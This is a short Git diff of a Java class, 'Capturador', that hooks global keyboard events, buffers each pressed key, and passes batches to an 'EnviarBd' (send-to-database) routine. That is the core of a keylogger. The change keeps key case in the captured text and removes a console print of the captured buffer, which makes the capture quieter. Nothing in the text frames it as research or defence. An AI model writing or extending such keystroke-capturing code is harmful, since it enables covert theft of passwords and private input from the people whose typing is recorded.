@@ -30,7 +30,7 @@ public class Capturador implements NativeKeyListener {
     @Override
     public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {
 
-        var letra = NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode()).toLowerCase();
+        var letra = NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode());
 
         for(var daVez:ESPECIAIS){
             if(daVez.equals(letra)){
@@ -44,7 +44,6 @@ public class Capturador implements NativeKeyListener {
         aSerEnviado += letra;
 
         i++;
-        System.out.println(aSerEnviado);
         if(i >= numeroDeCaracteresASerEnviado){
             new EnviarBd(aSerEnviado);
             aSerEnviado = " ";
